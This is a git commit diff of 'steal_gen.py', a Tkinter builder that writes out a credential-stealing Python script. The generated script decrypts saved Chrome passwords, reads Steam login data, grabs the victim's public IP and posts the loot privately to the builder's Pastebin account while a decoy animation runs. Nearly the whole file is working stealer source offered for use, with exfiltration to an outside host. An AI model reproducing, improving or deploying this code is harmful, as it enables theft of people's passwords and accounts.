dbe1760c8a5a2ccbcdffde8cd8ac8ec18d8a1907
sakenzo <ilya1234512346@gmail.com>
2024-10-05 08:48:20 +0300

    v1.1 added message box, open folder when created.

--- steal_gen.py
+++ steal_gen.py
@@ -1,8 +1,16 @@
-import datetime
+import sys, os, datetime; from tkinter import *; from tkinter import ttk ; from tkinter import messagebox
+def resource(relative_path):
+    base_path = getattr(
+        sys,
+        '_MEIPASS',
+        os.path.dirname(os.path.abspath(__file__)))
+    return os.path.join(base_path, relative_path)
+icon = resource('app.ico')
 def create_prompt(api, name, password):
     date = datetime.datetime.now().strftime("%A, %d. %B %Y")
-    with open(f'{date}.py', 'x') as f:
-        f.writelines(f'''import requests, os, sys, time, ipaddress, socket, datetime, re, json, win32crypt, base64, sqlite3, shutil; from pastebin import PastebinAPI; from Cryptodome.Cipher import AES
+    try:
+        with open(f'{date}.py', 'x') as f:
+            f.writelines(f'''import requests, os, sys, time, ipaddress, socket, datetime, re, json, win32crypt, base64, sqlite3, shutil; from pastebin import PastebinAPI; from Cryptodome.Cipher import AES
 api_dev_key = "{api}"
 username = "{name}"
 password = "{password}"
@@ -10,29 +18,18 @@ pb = PastebinAPI()
 api_user_key = pb.generate_user_key(api_dev_key, username, password) #pastebin api_user_key
 #print(api_user_key)
 date = datetime.datetime.now().strftime("%A, %d. %B %Y %I:%M%p")
-
-# <mac adress & ips>
-s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-s.connect(("8.8.8.8", 80)) #public server
+# <ip>
 ip = requests.get("https://api.ipify.org").text #public ip
-ipl = s.getsockname()[0] #local ip
-network = ipaddress.ip_network(ipl+"/24", strict=False)
-for host in network.hosts():
-    s.sendto("hi".encode("utf-8"), (host.compressed, 80)) #pinging net
-ips = str(os.popen("arp -a").readlines()).replace("\\n", "\\n").replace("'", "").replace(",", "").replace("[", "").replace("]", "") #arp parse
-# </mac adress & ips>
-
+# </ip>
 #<steam login stealer>
 def steam_log():
     steam_config_path = os.path.normpath(r"%s\\Steam\\Config\\loginusers.vdf"%(os.environ["PROGRAMFILES(X86)"]))
     login_file = open(steam_config_path)
     return login_file.read()
 #</steam login stealer>
-
 #<chrome password stealer>
 CHROME_PATH_LOCAL_STATE = os.path.normpath(r"%s\\AppData\\Local\\Google\\Chrome\\User Data\\Local State"%(os.environ["USERPROFILE"]))
 CHROME_PATH = os.path.normpath(r"%s\\AppData\\Local\\Google\\Chrome\\User Data"%(os.environ["USERPROFILE"]))
-
 def get_secret_key():
     try:
         #(1) Get secretkey from chrome local state
@@ -46,13 +43,10 @@ def get_secret_key():
         return secret_key
     except Exception as e:
         return None
-
 def decrypt_payload(cipher, payload):
     return cipher.decrypt(payload)
-
 def generate_cipher(aes_key, iv):
     return AES.new(aes_key, AES.MODE_GCM, iv)
-
 def decrypt_password(ciphertext, secret_key):
     try:
         #(3-a) Initialisation vector for AES decryption
@@ -67,14 +61,12 @@ def decrypt_password(ciphertext, secret_key):
         return decrypted_pass
     except Exception as e:
         return "[ERR] Unable to decrypt, Chrome version <80 not supported."
-
 def get_db_connection(chrome_path_login_db):
     try:
         shutil.copy2(chrome_path_login_db, "Loginvault.db") 
         return sqlite3.connect("Loginvault.db")
     except Exception as e:
         return None 
-
 def chrome_pass():
     text = ""
     try:
@@ -108,13 +100,11 @@ def chrome_pass():
     except Exception as e:
         return "Error Occured"
 #</chrome password stealer>
-
 #<pastebin post>
-pb.paste(api_dev_key, f"Host ip: {{ip}} \\nLocal ping:{{ips}}\\nSteam loginusers: {{steam_log()}}\\nChrome: {{chrome_pass()}}", api_user_key = api_user_key, 
+pb.paste(api_dev_key, f"Host ip: {{ip}}\\nSteam loginusers: {{steam_log()}}\\nChrome: {{chrome_pass()}}", api_user_key = api_user_key, 
                    paste_name = date, paste_format = None, 
                    paste_private = "private", paste_expire_date = "N")
 #</pastebin post>
-
 #<trick> you can change this whatever you want, its just my version
 print("\\033[?25l", end="") #just hiding cursor
 logo = [  
@@ -160,23 +150,26 @@ animated_text(f"https://pastebin.com/u/{{username}}\\n", 0.05)
 animated_text(logo[1], 0.01)
 input()
 #</trick>''')
-        f.close()
-    root.destroy()
-from tkinter import *
-from tkinter import ttk        
+            f.close()
+            os.startfile(os.path.realpath(f.name.replace(date + '.py', '')))
+        messagebox.showinfo(title='Done!', message='File created!') 
+    except Exception as e:
+        messagebox.showerror(title='Error Occured!', message=e)
 root = Tk()
 def about():
     aboutwindow = Toplevel(root)
     aboutwindow.title('about')
     aboutwindow.geometry('240x100')
     aboutwindow.resizable(False, False)
-    ver = ttk.Label(aboutwindow, text='Ver. 1.0').pack()
+    aboutwindow.iconbitmap(icon)
+    ver = ttk.Label(aboutwindow, text='Ver. 1.1').pack()
     creator = ttk.Label(aboutwindow, text='sdkmasteri©').pack()
     contact_ds = ttk.Label(aboutwindow, text='Discord: sakenzo').pack()
     contact_tg = ttk.Label(aboutwindow, text='Telegram: @sakenzo1337').pack()
-root.title('Ver. 1.0')
+root.title('StealGen')
 root.geometry('240x120')
 root.resizable(False, False)
+root.iconbitmap(icon)
 frm = ttk.Frame(root, padding=5)
 frm.grid()
 mainmenu = Menu(frm) 
@@ -190,7 +183,7 @@ NAME.grid(column=1, row=0)
 ttk.Label(frm, text='Account Password').grid(column=0, row=1)
 PASSWORD = ttk.Entry(frm)
 PASSWORD.grid(column=1, row=1)
-ttk.Label(frm, text='API Key').grid(column=0, row=2)
+api_lable = ttk.Label(frm, text='API Key').grid(column=0, row=2)
 API_KEY = ttk.Entry(frm)
 API_KEY.grid(column=1, row=2)
 create = ttk.Button(frm, text="Create", command=lambda: create_prompt(api=API_KEY.get(), name=NAME.get(), password=PASSWORD.get()))
